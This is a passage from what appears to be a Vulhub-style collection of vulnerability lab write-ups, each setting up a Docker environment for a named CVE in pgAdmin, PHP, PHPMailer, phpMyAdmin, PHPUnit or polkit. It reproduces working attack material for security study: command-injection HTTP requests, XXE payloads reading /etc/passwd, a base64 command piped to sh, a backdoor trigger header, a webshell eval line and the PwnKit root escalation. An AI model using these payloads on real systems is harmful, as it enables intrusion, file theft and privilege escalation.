Before exploiting the vulnerability, send the following request to obtain the CSRF token:


GET /login HTTP/1.1
Host: your-ip:5050
Accept: application/json, text/plain, /
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8,en-US;q=0.7
Connection: close




Get the session id and csrf token from response:



Then, fill the following request with the session id and csrf token and send it:


POST /misc/validatebinarypath HTTP/1.1
Host: your-ip:5050
Content-Length: 27
X-pgA-CSRFToken: [csrf-token]
Accept: application/json, text/plain, /
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Content-Type: application/json
Accept-Encoding: gzip, deflate, br
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8,en-US;q=0.7
Cookie: pga4_session=[session-id]
Connection: close

{""utility_path"":""a\"";id;#""}


As you can see, id command has been executed successful:
-------------------------------------------------------------------------------","https://github.com/pgadmin-org/pgadmin4/commit/799b6d8f7c10e920c9e67c2c18d381d6320ca604
https://github.com/pgadmin-org/pgadmin4/commit/461849c2763e680ed2296bb8a753ca7aef546595
https://github.com/advisories/GHSA-3v6v-2x6p-32mc"
php,Unknown,PHP XDebug Remote Debugging Code Execution,"PHP XDebug Remote Debugging Code Execution

中文版本(Chinese version)

XDebug is a PHP extension used for debugging PHP code. When remote debugging mode is enabled with appropriate settings, an attacker can execute arbitrary PHP code on the target server by exploiting the debug protocol (DBGp).

For XDebug version 2.x, the vulnerability occurs when the following configuration is enabled:

ini
xdebug.remoteconnectback = 1
xdebug.remote_enable = 1


For XDebug version 3.x (which introduced breaking changes in configuration), the equivalent vulnerable configuration is:

ini
xdebug.mode = debug
xdebug.discoverclienthost = 1
xdebug.client_host = 1


When these configurations are enabled, XDebug will attempt to connect back to the attacker's IP through the DBGp protocol when a client visits the appropriate trigger URL. The DBGp protocol provides an eval function that can be used to execute arbitrary PHP code.

References:
<https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface
<https://xdebug.org

Environment Setup

Execute the following command to build and start the vulnerable environment:


docker compose up -d


The environment includes two services:
PHP 7.1 with XDebug 2.5.5: Accessible at http://your-ip:8080/
PHP 7.4 with XDebug 3.1.6: Accessible at http://your-ip:8081/

After the environment is started, visit each URL to see a simple phpinfo page. You can verify that XDebug is enabled and configured for remote debugging in the PHP configuration section.

Vulnerability Reproduction

Since the vulnerability requires communication using the DBGp protocol with the target server, it cannot be reproduced using HTTP protocol alone.

A proof-of-concept exploit script exp.py is provided that can execute arbitrary PHP code on the target server. The script supports both XDebug 2.x (port 9000) and XDebug 3.x (port 9003):

bash
Requires Python 3 and the requests library
python3 exp.py -t http://[target-ip]:8080/index.php -c 'shell_exec(""id"");' --dbgp-ip [attacker-ip]
python3 exp.py -t http://[target-ip]:8081/index.php -c 'shell_exec(""id"");' --dbgp-ip [attacker-ip]


Successful exploitation will execute the command and return its output:



Important Notes

The exploitation process involves a reverse connection:

1. The exploit script listens on port 9000 (XDebug 2.x) and port 9003 (XDebug 3.x), please make sure these ports are not blocked by the firewall
2. You have to have a public IP address or be in the same network as the target
3. If your public IP differs from your local machine, use the --dbgp-ip parameter to specify the IP address that the target server can reach
-------------------------------------------------------------------------------","https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface
https://xdebug.org
http://[target-ip]:8080/index.php
http://[target-ip]:8081/index.php"
php,Unknown,PHP XML External Entity Injection (XXE),"PHP XML External Entity Injection (XXE)

中文版本(Chinese version)

XML External Entity (XXE) Injection is a vulnerability that occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser. This vulnerability can lead to various attacks including disclosure of confidential data, denial of service, server side request forgery, port scanning, and other system impacts.

After libxml 2.9.0, external entity parsing is disabled by default, which largely mitigated XXE vulnerabilities. This environment uses libxml 2.8.0 compiled into PHP to demonstrate XXE vulnerabilities in PHP applications.

References:
OWASP XXE Prevention Cheat SheetProcessing)
PHP Documentation: libxml
CWE-611: Improper Restriction of XML External Entity Reference

Environment Setup

This environment is based on the PHP 7.0.30 with libxml 2.8.0, execute the following command to start the environment:


docker compose up -d


After the server starts, visit http://your-ip:8080/index.php to see the phpinfo page. You can verify the libxml version (2.8.0) by searching for ""libxml"" on that page.

The web root directory ./www contains three vulnerable PHP files demonstrating different XML parsing methods:

bash
$ tree .
.
├── dom.php               # Example: XML parsing using DOMDocument
├── index.php
├── SimpleXMLElement.php  # Example: XML parsing using SimpleXMLElement class
└── simplexmlloadstring.php  # Example: XML parsing using simplexmlloadstring function


All three files (dom.php, SimpleXMLElement.php, and simplexmlloadstring.php) are vulnerable to XXE attacks.

Vulnerability Reproduction

Send the following XML payload to any of the vulnerable files to read the contents of /etc/passwd:

xml
<?xml version=""1.0"" encoding=""utf-8""?
<!DOCTYPE xxe [
<!ELEMENT name ANY 
<!ENTITY xxe SYSTEM ""file:///etc/passwd"" ]
<root
<name&xxe;</name
</root


The successful exploitation will display the contents of the file:



Advanced Exploitation Techniques

Reading Arbitrary Files:

xml
<!ENTITY xxe SYSTEM ""file:///path/to/sensitive/file"" 


SSRF (Server-Side Request Forgery):

xml
<!ENTITY xxe SYSTEM ""http://internal.service.local"" 


Denial of Service (Billion Laughs Attack):

xml
<!ENTITY lol ""lol""
<!ENTITY lol2 ""&lol;&lol;""
<!ENTITY lol3 ""&lol2;&lol2;""
-------------------------------------------------------------------------------",
php,Unknown,PHP-FPM FastCGI Unauthorized Access Leads to Remote Code Execution,"PHP-FPM FastCGI Unauthorized Access Leads to Remote Code Execution

中文版本(Chinese version)

PHP-FPM (FastCGI Process Manager) is an alternative PHP FastCGI implementation with some additional features useful for sites of any size, especially busier sites. When misconfigured, PHP-FPM can be accessed directly through the FastCGI protocol, allowing attackers to execute arbitrary PHP code.

This vulnerability occurs when PHP-FPM is exposed to the network without proper access controls, allowing unauthorized access to the FastCGI interface.

References:
<https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html
<https://www.php.net/manual/en/install.fpm.php

Environment Setup

Execute the following command to start the vulnerable PHP-FPM server:

bash
docker compose up -d


After the server starts, the PHP-FPM server will listen on port 9000.

Vulnerability Reproduction

A proof-of-concept exploit script is available at: https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75

The script allows you to:

1. Connect directly to the PHP-FPM port
2. Send crafted FastCGI requests
3. Execute arbitrary PHP code on the target server

Successful exploitation result:
-------------------------------------------------------------------------------","https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html
https://www.php.net/manual/en/install.fpm.php
https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75"
php,CVE-2019-11043,PHP-FPM Remote Code Execution (CVE-2019-11043),"PHP-FPM Remote Code Execution (CVE-2019-11043)

中文版本(Chinese version)

PHP-FPM is a FastCGI implementation for PHP. In PHP versions 7.1.x below 7.1.33, 7.2.x below 7.2.24 and 7.3.x below 7.3.11 in certain configurations of FPM setup it is possible to cause FPM module to write past allocated buffers into the space reserved for FCGI protocol data, thus opening the possibility of remote code execution.

This vulnerability was first discovered during the Real World CTF 2019 Quals (organized by Chaitin Tech). It affects Nginx servers with certain misconfigurations when working with PHP-FPM, the most common vulnerable configuration includes location ~ [^/]\.php(/|$) rules.

References
PHP Bug Report: <https://bugs.php.net/bug.php?id=78599
Technical Analysis: <https://lab.wallarm.com/php-remote-code-execution-0-day-discovered-in-real-world-ctf-exercise/
Exploit Tool: <https://github.com/neex/phuip-fpizdam

Environment Setup

Start a vulnerable PHP-FPM 7.2.10 server with Nginx using the following command:


docker compose up -d


After the environment starts, you can access the default page at http://your-ip:8080/index.php.

Vulnerability Reproduction

The vulnerability can be exploited using the tool from https://github.com/neex/phuip-fpizdam:


$ go run . ""http://your-ip:8080/index.php""
2019/10/23 19:41:00 Base status code is 200
2019/10/23 19:41:00 Status code 502 for qsl=1795, adding as a candidate
2019/10/23 19:41:00 The target is probably vulnerable. Possible QSLs: [1785 1790 1795]
2019/10/23 19:41:02 Attack params found: --qsl 1790 --pisos 152 --skip-detect
2019/10/23 19:41:02 Trying to set ""session.auto_start=0""...
2019/10/23 19:41:02 Detect() returned attack params: --qsl 1790 --pisos 152 --skip-detect <-- REMEMBER THIS
2019/10/23 19:41:02 Performing attack using php.ini settings...
2019/10/23 19:41:02 Success! Was able to execute a command by appending ""?a=/bin/sh+-c+'which+which'&"" to URLs
2019/10/23 19:41:02 Trying to cleanup /tmp/a...
2019/10/23 19:41:02 Done!


The successful exploitation will be indicated by the output above:



After the initial exploitation, a webshell is injected into the PHP-FPM process. You can execute commands by visiting:


http://your-ip:8080/index.php?a=id


Example of successful command execution:



Important Notes

1. The vulnerability affects only some of the PHP-FPM child processes. If a command doesn't execute on the first try, make multiple attempts to reach an affected process.
2. The success of the exploit depends heavily on the specific Nginx configuration. The most common vulnerable configuration includes:
FastCGI processing enabled
PHP files processed through PHP-FPM
Specific location rules that split URLs in a vulnerable way
-------------------------------------------------------------------------------","https://bugs.php.net/bug.php?id=78599
https://lab.wallarm.com/php-remote-code-execution-0-day-discovered-in-real-world-ctf-exercise/
https://github.com/neex/phuip-fpizdam
https://github.com/neex/phuip-fpizdam:"
php,Unknown,PHP 8.1.0-dev User-Agentt Backdoor Remote Code Execution,"PHP 8.1.0-dev User-Agentt Backdoor Remote Code Execution

中文版本(Chinese version)

PHP version 8.1.0-dev was implanted with a backdoor on March 28, 2021, but the backdoor was quickly discovered and removed. When this backdoor is present on a server, an attacker can execute arbitrary code by sending a User-Agentt header.

References:
https://news-web.php.net/php.internals/113838
https://github.com/php/php-src/commit/c730aa26bd52829a49f2ad284b181b7e82a68d7d
https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a

Vulnerable Environment

Start a PHP 8.1-dev server with the backdoor.


docker compose up -d


After the environment is started, the service runs at http://your-ip:8080.

Vulnerability Reproduce

Send the following request to execute the code var_dump(233*233);:


GET / HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
User-Agentt: zerodiumvar_dump(233*233);
Connection: close
-------------------------------------------------------------------------------","https://news-web.php.net/php.internals/113838
https://github.com/php/php-src/commit/c730aa26bd52829a49f2ad284b181b7e82a68d7d
https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a"
php,Unknown,PHP Local File Inclusion RCE with PHPINFO,"PHP Local File Inclusion RCE with PHPINFO

中文版本(Chinese version)

In PHP file inclusion vulnerabilities, when we cannot find a valid file to include for triggering RCE, we might be able to include a temporary file to exploit it if there exists PHPINFO which can tell us the randomly generated filename of the temporary file and its location.

Reference:
https://dl.packetstormsecurity.net/papers/general/LFIWithPHPInfo_Assitance.pdf

Vulnerable Environment

To start the vulnerable environment:


docker compose up -d


The target environment is the latest PHP 7.2, which tell us this vulnerability exists regardless of the version.

After the environment is started, access http://your-ip:8080/phpinfo.php to get a PHPINFO page and http://your-ip:8080/lfi.php?file=/etc/passwd shows there is an LFI vulnerability.

Exploit Details

When sending a POST request to PHP and the request contains a FILE block, PHP will save the file posted into a temporary file (usually /tmp/php[6 random digits]), the filename can be found at $_FILES variable. This temp file will be deleted after the request is over.

In the meantime, PHPINFO page prints all the variables in the context, including $_FILES. So, the temp file's name can be found in the response if we send the POST request to the PHPINFO page.

In this way, an LFI vulnerability can be promoted into an RCE without an existed useable local file.

File inclusion and PHPINFO are usually in different web pages. In theory, we need to send the filename to the file inclusion page after retrieving the it in the response of the file uploading request to the PHPINFO page. However, after the first request finishes, the file would be removed from the disk, so we need to win the race.

Steps:

1. Send the file upload request to PHPINFO page with the HEADER and GET fields filled with large chunks of junk data.
2. The response content would be huge because PHPINFO will print out all the data.
3. PHP's default output buffer size is 4096 bytes. It can be understood as PHP return 4096 bytes each time during a socket connection.
4. So we use raw socket to achieve our goal. Each time we read 4096 bytes and send the filename to the LFI page once we get it.
5. By the time we got the filename, the first socket connection has not ended, which means the temp file still exists at that time.
6. By taking advantage of the time gap, the temp file can be included and executed.

Exploit

The python script exp.py implements the above process. After successfully include the temp file, <?php fileputcontents('/tmp/g', '<?=eval($_REQUEST[1])?')?will be executed to generate a permanent file /tmp/g for further use.

use python2：python exp.py your-ip 8080 100:



The script success at the 189th packet, after that arbitrary code can be executed:
-------------------------------------------------------------------------------",https://dl.packetstormsecurity.net/papers/general/LFI_With_PHPInfo_Assitance.pdf
php,CVE-2012-1823,PHP-CGI Remote Code Execution (CVE-2012-1823),"PHP-CGI Remote Code Execution (CVE-2012-1823)

中文版本(Chinese version)

PHP-CGI is a SAPI (Server Application Programming Interface) implementation that allows PHP to communicate with web servers. A vulnerability in PHP-CGI allows attackers to pass command-line arguments to PHP through query strings, potentially leading to remote code execution.

Affected versions: PHP < 5.3.12 or PHP < 5.4.2

References:
<http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/
<https://www.leavesongs.com/PENETRATION/php-cgi-cve-2012-1823.html

Environment Setup

Execute the following command to start a web server that uses PHP-CGI 5.4.1:


docker compose up -d


After the server starts, visit http://your-ip:8080/ to see the ""Hello"" message.

Vulnerability Reproduction

Visit http://your-ip:8080/index.php?-s to reveal the source code, confirming the vulnerability exists. Send the following request to execute arbitrary PHP code:


POST /index.php?-d+allowurlinclude%3don+-d+autoprependfile%3dphp%3a//input HTTP/1.1
Host: example.com
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 31

<?php echo shell_exec(""id""); ?


Technical Details

PHP SAPI and Running Modes

PHP-CGI can run in two modes:

1. CGI mode: The web server creates a new process for each request
2. FastCGI mode: A persistent process handles multiple requests

According to RFC3875, when the query string doesn't contain an unencoded = character, it should be passed as CGI parameters. Apache implemented this requirement, but PHP didn't properly handle this case, leading to this vulnerability.

The simplest exploitation method is using the -s parameter to display source code:



A more powerful method is using -d to specify autoprependfile, creating an arbitrary file inclusion vulnerability:



Note: Replace spaces with + or %20, and encode = characters.

CVE-2012-2311 - The Incomplete Fix

PHP initially fixed this vulnerability in versions 5.4.2 and 5.3.12 by checking for the - character at the start of the query string. However, this fix was incomplete and could be bypassed (CVE-2012-2311) when PHP-CGI was wrapped in a shell script:

sh
!/bin/sh
exec /usr/local/bin/php-cgi $*


By adding whitespace before the -, attackers could still pass parameters as the first character would be a space instead of -.

PHP addressed this in versions 5.4.3 and 5.3.13 by skipping all leading whitespace before checking for the - character.
-------------------------------------------------------------------------------","http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/
https://www.leavesongs.com/PENETRATION/php-cgi-cve-2012-1823.html"
php,CVE-2018-19518,PHP IMAP Remote Command Execution (CVE-2018-19518),"PHP IMAP Remote Command Execution (CVE-2018-19518)

中文版本(Chinese version)

The PHP IMAP extension is used for email operations in PHP. Its imap_open function calls rsh to connect to remote shells. In Debian/Ubuntu systems, ssh is used by default instead of rsh (meaning when you execute the rsh command, it actually executes ssh).

Since the ssh command allows setting -oProxyCommand= to call third-party commands, attackers can inject this parameter to achieve remote command execution.

References:
<https://bugs.php.net/bug.php?id=77153
<https://github.com/Bo0oM/PHPimapopen_exploit
<https://antichat.com/threads/463395/#post-4254681
<https://nvd.nist.gov/vuln/detail/CVE-2018-19518

Environment Setup

Execute the following command to start a vulnerable PHP server:


docker compose up -d


After the server starts, visit http://your-ip:8080 to access the web page. The web functionality tests whether a mail server can be successfully connected, requiring server address, username, and password.

The source code can be found in index.php

Vulnerability Reproduction

Send the following request to execute the command echo '1234567890'/tmp/test0001:


POST / HTTP/1.1
Host: your-ip
Accept-Encoding: gzip, deflate
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 125

hostname=x+-oProxyCommand%3decho%09ZWNobyAnMTIzNDU2Nzg5MCc%2bL3RtcC90ZXN0MDAwMQo%3d|base64%09-d|sh}&username=111&password=222


Execute docker compose exec web bash to enter the container, and you can see that /tmp/test0001 has been successfully created:
-------------------------------------------------------------------------------","https://bugs.php.net/bug.php?id=77153
https://github.com/Bo0oM/PHP_imap_open_exploit
https://antichat.com/threads/463395/#post-4254681
https://nvd.nist.gov/vuln/detail/CVE-2018-19518"
php,CVE-2024-2961,PHP File Read to Remote Code Execution Through GNU C Library Iconv (CVE-2024-2961),"PHP File Read to Remote Code Execution Through GNU C Library Iconv (CVE-2024-2961)

中文版本(Chinese version)

The GNU C Library is designed to be a backwards compatible, portable, and high performance ISO C library.

The iconv() function in the GNU C Library versions 2.39 and older may overflow the output buffer passed to it by up to 4 bytes when converting strings to the ISO-2022-CN-EXT character set, which may be used to crash an application or overwrite a neighbouring variable.

If an arbitrary file read vulnerability in PHP application, you can upgrade it to remote code execution through the iconv() issue CVE-2024-2961.

References:
<https://www.ambionics.io/blog/iconv-cve-2024-2961-p1

Vulnerable environment

Execute following command to start a PHP 8.3.4 server with iconv 2.36:


docker compose up -d


After the server is started, you can read the /etc/passwd through http://your-ip:8080/index.php?file=/etc/passwd.

Exploit

Before using the exploit, you have to prepare a Linux based system and the Python 3.10+.

Install the dependencies:


pip install pwntools
pip install https://github.com/cfreal/ten/archive/refs/heads/main.zip


Then download and run the POC from <https://raw.githubusercontent.com/ambionics/cnext-exploits/main/cnext-exploit.py:


wget https://raw.githubusercontent.com/ambionics/cnext-exploits/main/cnext-exploit.py
python cnext-exploit.py http://your-ip:8080/index.php ""echo '<?=phpinfo();?' shell.php""




As you can see, shell.php has been written successfully:
-------------------------------------------------------------------------------","https://www.ambionics.io/blog/iconv-cve-2024-2961-p1
https://github.com/cfreal/ten/archive/refs/heads/main.zip
https://raw.githubusercontent.com/ambionics/cnext-exploits/main/cnext-exploit.py
https://raw.githubusercontent.com/ambionics/cnext-exploits/main/cnext-exploit.py
http://your-ip:8080/index.php"
phpmailer,CVE-2017-5223,PHPMailer Arbitrary File Read (CVE-2017-5223),"PHPMailer Arbitrary File Read (CVE-2017-5223)

中文版本(Chinese version)

PHPMailer is a popular PHP library for sending emails.

Before the PHPMailer 5.2.18, during the email sending process, PHPMailer searches for image tags (<img src=""..."") in the email content and extracts their src attribute values as attachments. Therefore, if we can control part of the email content, we can use <img src=""/etc/passwd""to read the file /etc/passwd as an attachment, resulting in an arbitrary file read vulnerability.

References:
http://www.freebuf.com/vuls/124820.html
https://www.exploit-db.com/exploits/43056/

Environment Setup

First, create a .env file in the current directory with the following content (modify the configuration values to your SMTP server, account, and password):


SMTP_SERVER=smtp.example.com
SMTP_PORT=587
SMTPEMAIL=youremail@example.com
SMTP_PASSWORD=secret
SMTP_SECURE=tls


Here, SMTP_SECURE is the SMTP encryption method, which can be set to none, ssl, or tls.

Then compile and run the test environment:


docker compose build
docker compose up -d


After the server starts, visit http://your-ip:8080/ to see a ""Feedback"" page.

Vulnerability Reproduction

On the ""Feedback"" page, normal users fill in their nickname, email, and feedback for submission. This information will be stored by the backend, and the backend will send an email to notify users that their feedback has been submitted:



This scenario is common in real-world applications. For example, when users successfully register on a website, they usually receive a notification email containing their nickname. Therefore, if we insert malicious code <img src=""/etc/passwd""in the nickname field, files on the target server will be read as attachments.

Similarly, we can place the malicious code in the ""Feedback"" field:



When receiving the email, it contains attachments /etc/passwd and /etc/hosts:



Download and read the files.
-------------------------------------------------------------------------------","http://www.freebuf.com/vuls/124820.html
https://www.exploit-db.com/exploits/43056/"
phpmyadmin,Unknown,Phpmyadmin Scripts/setup.php Deserialization Vulnerability (WooYun-2016-199433),"Phpmyadmin Scripts/setup.php Deserialization Vulnerability (WooYun-2016-199433)

中文版本(Chinese version)

Affected version: 2.x

Setup

Run the following command to start phpmyadmin:


docker compose up -d


Visit http://your-ip:8080 and you will see the phpmyadmin home page. Because there is no connection to the database, we will get an error. But this vulnerability is not related to the database, so just ignore.

Exploit

Send the following package to read /etc/passwd:


POST /scripts/setup.php HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 80

action=test&configuration=O:10:""PMA_Config"":1:{s:6:""source"",s:11:""/etc/passwd"";}
-------------------------------------------------------------------------------",
phpmyadmin,CVE-2016-5734,PhpMyAdmin 4.0.x—4.6.2 Remote Code Execution Vulnerability (CVE-2016-5734),"PhpMyAdmin 4.0.x—4.6.2 Remote Code Execution Vulnerability (CVE-2016-5734)

中文版本(Chinese version)

PhpMyAdmin is a free software tool written in PHP, intended to handle the administration of MySQL over the Web. The vulnerability is in the preg_replace function, because the information submitted by the user can be spliced into the first parameter.

Before PHP 5.4.7, the first parameter of preg_replace could be truncated with \0 and the change search pattern to \e. It can cause remote code execution vulnerability.

Affected versions:
4.0.x version before 4.0.10.16
4.4.x version before 4.4.15.7
4.6.x version before 4.6.3 (actually because this version requires PHP5.5+, this vulnerability cannot be reproduced)

Setup

Execute following commands to start PHP 5.3 + Apache + phpMyAdmin 4.4.15.6:


docker compose up -d 


After start, visit http://your-ip:8080 and you will see the login page of phpMyAdmin. Log in with root:root.

Exploit

This vulnerability requires login and the permission to write data.

We use this POC(https://www.exploit-db.com/exploits/40185/) to reproduce the vulnerability.


./cve-2016-5734.py -c 'system(id);' -u root -p root -d test http://your-ip:8080/


Result:
-------------------------------------------------------------------------------",http://your-ip:8080/
phpmyadmin,CVE-2018-12613,phpmyadmin 4.8.1 Remote File Inclusion Vulnerability (CVE-2018-12613),"phpmyadmin 4.8.1 Remote File Inclusion Vulnerability (CVE-2018-12613)

中文版本(Chinese version)

PhpMyAdmin is a free software tool written in PHP, intended to handle the administration of MySQL over the Web. The vulnerability is in the index.php, causing  files iclusion vulnerabilitiy.

Reference links:
https://mp.weixin.qq.com/s/HZcS2HdUtqz10jUEN57aog
https://www.phpmyadmin.net/security/PMASA-2018-4/

Setup

Run the following command to start phpmyadmin 4.8.1:


docker compose up -d


After the environment starts, visit http://your-ip:8080. The phpmyadmin is ""config"" mode, so we can login directly.

Exploit

Visit http://your-ip:8080/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd, the result indicates that the file inclusion vulnerability exist:



We can execute SELECT '<?=phpinfo()?';, then check your sessionid (the value of phpMyAdmin in the cookie), and then include the session file:
-------------------------------------------------------------------------------","https://mp.weixin.qq.com/s/HZcS2HdUtqz10jUEN57aog
https://www.phpmyadmin.net/security/PMASA-2018-4/"
phpunit,CVE-2017-9841,PHPUnit Remote Code Execution (CVE-2017-9841),"PHPUnit Remote Code Execution (CVE-2017-9841)

中文版本(Chinese version)

PHPUnit is a programmer-oriented testing framework for PHP.

Util/PHP/eval-stdin.php in PHPUnit before 4.8.28 and 5.x before 5.6.3 allows remote attackers to execute arbitrary PHP code via HTTP POST data beginning with a <?php substring, as demonstrated by an attack on a site with an exposed /vendor folder, i.e., external access to the /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php URI.

The Util/PHP/eval-stdin.php's vulnerable code:

php
eval('?'.filegetcontents('php://input'));


Reference links:
http://web.archive.org/web/20170701212357/http://phpunit.vulnbusters.com/
https://www.ovh.com/blog/cve-2017-9841-what-is-it-and-how-do-we-protect-our-customers/

Vulnerable environment

Execute following command to start a Apache web server, which contains the PHPUnit 5.6.2 in the Web directory.


docker compose up -d


Open the http://your-ip:8080 to see the index page util Web server is running.

Exploit

Send the request to http://your-ip:8080/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php, which contains any PHP code within the body:
-------------------------------------------------------------------------------","http://web.archive.org/web/20170701212357/http://phpunit.vulnbusters.com/
https://www.ovh.com/blog/cve-2017-9841-what-is-it-and-how-do-we-protect-our-customers/"
polkit,CVE-2021-4034,Polkit's pkexec Local Privilege Escalation Vulnerability (CVE-2021-4034),"Polkit's pkexec Local Privilege Escalation Vulnerability (CVE-2021-4034)

中文版本(Chinese version)

Polkit (formerly PolicyKit) is a component for controlling system-wide privileges in Unix-like operating systems. The pkexec application is a setuid tool that provided by Polkit, it is designed to allow unprivileged users to run commands as privileged users according predefined policies.

The current version of pkexec doesn't handle the calling parameters count correctly and ends trying to execute environment variables as commands. An attacker can leverage this by crafting environment variables in such a way it'll induce pkexec to execute arbitrary code. When successfully executed the attack can cause a local privilege escalation giving unprivileged users administrative rights on the target machine.

References:
https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034
https://github.com/berdav/CVE-2021-4034

Vulnerability Environment

Note: Linux kernel is fixed the argc==0 bug in this commit, so Vulhub uses a Qemu virtual machine emulator to run a vulnerable Ubuntu 20.04, that contains polkit version 0.105. It required your system have at least 2G memory to run the environment.

You can run following command to start the Ubuntu 20.04 with polkit 0.105:


docker compose up -d


Because there is a virtual server running inside Docker container, you will need to wait longer until you see the success logs using docker compose logs -f like that:


cmd_1  | [  651.040963] cloud-init[1627]: Cloud-init v. 20.1-10-g71af48df-0ubuntu5 running 'modules:final' at Wed, 11 Jan 2023 14:57:10 +0000. Up 209.05 seconds.
cmd_1  | [  651.046024] cloud-init[1627]: ci-info: no authorized SSH keys fingerprints found for user ubuntu.
cmd_1  | [  651.049934] cloud-init[1627]: Cloud-init v. 20.1-10-g71af48df-0ubuntu5 finished at Wed, 11 Jan 2023 15:04:32 +0000. Datasource DataSourceNoCloud [seed=/dev/sdb][dsmode=net].  Up 650.90 seconds
cmd_1  | [  OK  ] Finished Execute cloud user/final scripts.
cmd_1  | [  OK  ] Reached target Cloud-init target.




Exploit

Firstly, use ubuntu/vulhub to login the target SSH server:


ssh ubuntu@192.168.1.163 -p2222


Use this repository to reproduce the CVE-2021-4034:


ubuntu@ubuntu:~$ id
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev),118(lxd)
ubuntu@ubuntu:~$ cd /tmp/
ubuntu@ubuntu:/tmp$ wget https://github.com/berdav/CVE-2021-4034/archive/refs/heads/main.tar.gz
-2023-01-11 15:11:29--  https://github.com/berdav/CVE-2021-4034/archive/refs/heads/main.tar.gz
Resolving github.com (github.com)... 20.205.243.166
Connecting to github.com (github.com)|20.205.243.166|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://codeload.github.com/berdav/CVE-2021-4034/tar.gz/refs/heads/main [following]
-2023-01-11 15:11:30--  https://codeload.github.com/berdav/CVE-2021-4034/tar.gz/refs/heads/main
Resolving codeload.github.com (codeload.github.com)... 20.205.243.165
Connecting to codeload.github.com (codeload.github.com)|20.205.243.165|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [application/x-gzip]
Saving to: ‘main.tar.gz’

main.tar.gz                                            [ <=                                                                                                            ]   4.08K  --.-KB/s    in 0.003s

2023-01-11 15:11:30 (1.49 MB/s) - ‘main.tar.gz’ saved [4176]

ubuntu@ubuntu:/tmp$ tar -zxvf main.tar.gz
CVE-2021-4034-main/
CVE-2021-4034-main/.gitignore
CVE-2021-4034-main/LICENSE
CVE-2021-4034-main/Makefile
CVE-2021-4034-main/README.md
CVE-2021-4034-main/cve-2021-4034.c
CVE-2021-4034-main/cve-2021-4034.sh
CVE-2021-4034-main/dry-run/
CVE-2021-4034-main/dry-run/Makefile
CVE-2021-4034-main/dry-run/dry-run-cve-2021-4034.c
CVE-2021-4034-main/dry-run/pwnkit-dry-run.c
CVE-2021-4034-main/pwnkit.c
ubuntu@ubuntu:/tmp$ cd CVE-2021-4034-main/
ubuntu@ubuntu:/tmp/CVE-2021-4034-main$ make
cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c
cc -Wall    cve-2021-4034.c   -o cve-2021-4034
echo ""module UTF-8// PWNKIT// pwnkit 1"" gconv-modules
mkdir -p GCONV_PATH=.
cp -f /usr/bin/true GCONV_PATH=./pwnkit.so:.
ubuntu@ubuntu:/tmp/CVE-2021-4034-main$ ./cve-2021-4034
id
uid=0(root) gid=0(root) groups=0(root),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev),118(lxd),1000(ubuntu)




As you can see, I currently become a root user after exploits.
-------------------------------------------------------------------------------","https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034
https://github.com/berdav/CVE-2021-4034
https://github.com/berdav/CVE-2021-4034/archive/refs/heads/main.tar.gz
https://github.com/berdav/CVE-2021-4034/archive/refs/heads/main.tar.gz
https://codeload.github.com/berdav/CVE-2021-4034/tar.gz/refs/heads/main
https://codeload.github.com/berdav/CVE-2021-4034/tar.gz/refs/heads/main"
postgres,CVE-2018-1058,"PostgreSQL Privilege Escalation (CVE-2018-1058)

中文文档

PostgreSQL is a powerful open-source relational database system. A logical error exists in versions 9.3 through 10, where superusers can unknowingly execute malicious code created by regular users, leading to unexpected operations.

References:
https://wiki.postgresql.org/wiki/AGuidetoCVE-2018-1058:ProtectYourSearch_Path
https://xianzhi.aliyun.com/forum/topic/2109

Environment Setup

